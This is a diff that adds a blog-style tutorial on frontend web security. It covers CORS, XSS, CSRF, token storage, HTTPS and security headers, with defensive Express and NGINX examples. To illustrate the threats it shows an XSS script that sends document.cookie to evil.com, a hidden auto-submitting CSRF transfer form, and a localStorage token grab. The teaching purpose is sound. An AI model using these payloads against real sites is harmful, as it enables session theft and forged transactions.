@@ -1,0 +1,326 @@
+---
+title: Frontend Security
+description: Understanding security for frontend engineers.
+date: 2024-09-12
+thumbnail: '/images/undraw/image-12.png'
+tags:
+  - javascript
+---
+
+## 1. CORS Misconfigurations
+
+### **🔎 What it is**
+
+CORS (Cross-Origin Resource Sharing) controls **which domains are allowed** to make requests to your backend from the browser. Without it, your frontend app wouldn’t be able to call your API if it’s hosted on a different domain.
+
+### **🚨The Threat**
+
+A common mistake is allowing:
+
+```
+Access-Control-Allow-Origin: *
+```
+
+This means **any site** can send requests to your API — and if cookies or tokens are attached, attackers can impersonate users and steal data.
+
+### **🛡️ The Solution**
+
+✅ Whitelist only your trusted frontend domains
+
+✅ Enable credentials **only when required**
+
+✅ Restrict HTTP methods
+
+**Secure Express setup example:**
+
+```javascript
+import cors from "cors";
+
+app.use(cors({
+  origin: "https://yourapp.com", // ✅ only your frontend
+  credentials: true,             // ⚠️ enable only if you send cookies
+  methods: ["GET", "POST"],      // ✅ restrict allowed methods
+}));
+```
+
+## 2. XSS (Cross-Site Scripting)
+
+### **🔎 What it is**
+
+XSS (Cross-Site Scripting) happens when attackers inject malicious JavaScript into your app. This code runs inside the user’s browser and can steal cookies, tokens, or sensitive data.
+
+### **🚨 The Threat**
+
+If user-generated content is rendered without sanitization, an attacker could inject:
+
+```
+<script>
+  fetch("https://evil.com/steal?cookie=" + document.cookie)
+</script>
+```
+
+This script would execute in the victim’s browser and send their session cookie to the attacker’s server.
+
+### **🛡️ The Solution**
+
+✅ Always sanitize and escape user input
+
+✅ Avoid `dangerouslySetInnerHTML` in React
+
+✅ Set a **Content Security Policy (CSP)** to block unauthorized scripts
+
+**Secure Rendering in React:**
+
+```
+import DOMPurify from "dompurify";
+```
+
+```
+// ✅ Sanitize user input before rendering
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
+```
+
+**CSP Header Example:**
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'
+```
+
+## 3. CSRF (Cross-Site Request Forgery)
+
+### **🔎 What it is**
+
+CSRF (Cross-Site Request Forgery) tricks an authenticated user’s browser into sending unintended requests to your backend. Since the browser automatically includes cookies with requests, attackers can exploit this to perform actions without the user’s knowledge.
+
+### **🚨 The Threat**
+
+Imagine you’re logged into a banking app. You visit a malicious site that silently submits a hidden form:
+
+```
+<form action="https://bank.com/transfer" method="POST">
+  <input type="hidden" name="amount" value="5000" />
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+Your browser includes your valid session cookies, and the bank processes it as if you initiated the transfer.
+
+### **🛡️ The Solution**
+
+✅ Use **SameSite cookies** to restrict cross-site requests
+
+✅ Generate and validate **CSRF tokens** for sensitive actions
+
+✅ Verify the **Origin** or **Referer** header on the backend
+
+**Secure Cookie Setup:**
+
+```
+Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
+```
+
+**CSRF Token Example (Frontend with Axios):**
+
+```
+const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
+
+await axios.post("/update-profile", data, {
+  headers: { "X-CSRF-Token": csrfToken },
+  withCredentials: true,
+});
+```
+
+**CSRF Middleware (Express) example:**
+
+```
+import csrf from "csurf";
+app.use(csrf({ cookie: true }));
+
+app.post("/update-profile", (req, res) => {
+  res.send("Profile updated securely ✅");
+});
+```
+
+## 4. Insecure Cookies & Token Storage**
+
+### **🔎 What it is**
+
+Cookies and tokens (like JWTs) are used to store user authentication and session data. If stored or configured incorrectly, they can be stolen through attacks like XSS or intercepted over insecure connections.
+
+### **🚨 The Threat**
+
+A common mistake is storing JWTs in `localStorage` or `sessionStorage`. If an attacker injects malicious JavaScript, they can easily grab the token:
+
+```
+// XSS injected code
+console.log(localStorage.getItem("authToken"));
+```
+
+With that token, the attacker can impersonate the user and access protected APIs.
+
+### **🛡️ The Solution**
+
+✅ Store sensitive tokens in **HttpOnly cookies** (not accessible via JavaScript)
+
+✅ Always use the `Secure` flag so cookies are sent only over HTTPS
+
+✅ Add `SameSite=Strict` to block cross-site misuse
+
+✅ Keep expiry times short and rotate tokens regularly
+
+**Secure Cookie Example:**
+
+```
+Set-Cookie: authToken=xyz123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
+```
+
+**Frontend API Call Using HttpOnly Cookies example:**
+
+```
+const response = await fetch("/api/profile", {
+  method: "GET",
+  credentials: "include", // ✅ sends HttpOnly cookie automatically
+});
+```
+
+**Backend Example (Express) exmaple:**
+
+```
+res.cookie("authToken", token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: "strict",
+  maxAge: 3600000, // 1 hour
+});
+```
+
+## 5. HTTPS Everywhere**
+
+### **🔎 What it is**
+
+HTTPS (Hypertext Transfer Protocol Secure) encrypts communication between the browser and the server. It ensures that sensitive data like cookies, tokens, or personal information cannot be read or modified by attackers while in transit.
+
+### **🚨 The Threat**
+
+If your app uses plain HTTP, attackers on the same network (like public Wi-Fi) can:
+
+- **Eavesdrop** on API calls and steal tokens/cookies
+- **Inject malicious responses** (man-in-the-middle attacks)
+- **Redirect traffic** to phishing or fake servers
+
+For example, an HTTP request might expose your token in plain text:
+
+```
+GET /api/profile HTTP/1.1
+Host: myapp.com
+Authorization: Bearer xyz123
+```
+
+Anyone intercepting traffic sees everything.
+
+### **🛡️ The Solution**
+
+✅ Always use HTTPS (get a free SSL cert via Let’s Encrypt)
+
+✅ Redirect all HTTP traffic to HTTPS
+
+✅ Use **HSTS (HTTP Strict Transport Security)** to enforce HTTPS
+
+**Express Redirect Example:**
+
+```
+app.use((req, res, next) => {
+  if (req.protocol === "http") {
+    res.redirect(301, `https://${req.headers.host}${req.url}`);
+  } else {
+    next();
+  }
+});
+```
+
+**HSTS Header Example:**
+
+```
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+```
+
+**NGINX Config Example:**
+
+```
+server {
+    listen 80;
+    server_name myapp.com;
+    return 301 https://$host$request_uri;
+}
+```
+
+Its okay to use http in local but deployed environments should always have https enabled
+
+## 6. Security Headers That Save You**
+
+### **🔎 What it is**
+
+Security headers are special HTTP response headers that tell the browser how to handle content. They act as **built-in guards** against common web attacks like clickjacking, MIME sniffing, or unauthorized script execution.
+
+### **🚨 The Threat**
+
+Without proper headers:
+
+- Your app could be embedded in an `<iframe>` → enabling **clickjacking** attacks.
+- Browsers might try to “guess” file types → leading to **MIME sniffing** exploits.
+- Third-party scripts could load freely → increasing **XSS risks**.
+- Sensitive referrer info could leak across sites.
+
+### **🛡️ The Solution**
+
+✅ Set security headers at the server or CDN level
+
+✅ Combine them with HTTPS and cookies for stronger protection
+
+**Example Header Config (Express + Helmet):**
+
+```
+import helmet from "helmet";
+app.use(helmet());
+```
+
+This automatically applies safe defaults. You can customize further:
+
+```
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Content-Security-Policy: default-src 'self'
+Permissions-Policy: geolocation=(), microphone=()
+```
+
+**NGINX Config Example:**
+
+```bash
+add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";
+add_header X-Frame-Options "DENY";
+add_header X-Content-Type-Options "nosniff";
+add_header Referrer-Policy "strict-origin-when-cross-origin";
+add_header Content-Security-Policy "default-src 'self'";
+add_header Permissions-Policy "geolocation=(), microphone=()";
+```
+
+# **✅ The Frontend Security Checklist**
+
+You can have a go-to checklist like this that helps you keep yrack whether the best practices are being followed while you code
+
+- Use **HTTPS everywhere** (enforce + HSTS)
+- Configure **CORS** properly → whitelist origins, restrict methods, allow credentials only if needed
+- Protect against **XSS** → sanitize inputs, avoid unsafe rendering, use CSP
+- Prevent **CSRF** → `SameSite=Strict` cookies, CSRF tokens, validate `Origin/Referer`
+- Secure **Cookies & Tokens** → HttpOnly, Secure, SameSite, short expiry, rotate tokens
+- Set **Important** **Security Headers** →
+
+```bash
+`Strict-Transport-Security`
+`X-Frame-Options: DENY`
+`X-Content-Type-Options: nosniff`
+`Referrer-Policy: strict-origin-when-cross-origin`
+`Permissions-Policy`
+```
